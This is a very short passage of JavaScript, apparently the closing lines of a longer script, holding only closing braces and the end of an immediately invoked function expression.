      }
    });
  }

})();
